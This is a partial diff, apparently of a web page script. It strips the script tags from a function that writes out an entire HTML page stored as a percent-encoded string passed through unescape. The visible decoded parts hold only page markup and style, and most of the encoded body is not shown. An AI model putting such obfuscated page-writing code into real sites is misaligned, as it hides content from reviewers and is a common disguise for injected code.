@@ -1,4 +1,3 @@
-<script language="javascript">
 function aji(){
 document.write(unescape('%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%0A%3C%73%74%79%6C%65%3E%0A%70%7B%0A%63%6F%6C
 
@@ -106,4 +105,4 @@ document.write(unescape('%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%0A%3C%73%74%79%
 
 %22%29%3B%0A%0A%7D%0A%0A%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A%3C%2F%68%74%6D%6C%3E'));
 }
-</script>
+
